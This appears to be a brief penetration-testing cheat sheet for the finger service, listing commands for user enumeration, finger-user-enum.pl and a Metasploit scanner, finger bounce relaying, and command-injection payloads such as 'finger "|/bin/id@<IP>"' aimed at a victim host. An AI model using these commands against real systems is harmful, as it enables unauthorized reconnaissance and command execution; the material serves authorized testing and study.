## BASIC LOGIN
```bash
finger @<IP>  
finger <USER>@<IP>
```
## COMMAND EXEC
```bash
finger "|/bin/id@<IP>"  
finger "|/bin/ls -a /<IP>"

finger @<Victim>       #List users
finger admin@<Victim>  #Get info of user
finger user@<Victim>   #Get info of user
```
## CHECK USERS
```md
finger-user-enum.pl -U users.txt -t 10.0.0.1
finger-user-enum.pl -u root -t 10.0.0.1
finger-user-enum.pl -U users.txt -T ips.txt
```
## METASPLOIT
```md
use auxiliary/scanner/finger/finger_users
```
## FINGER BOUNCE
```md
finger user@host@victim
finger @internal@external
```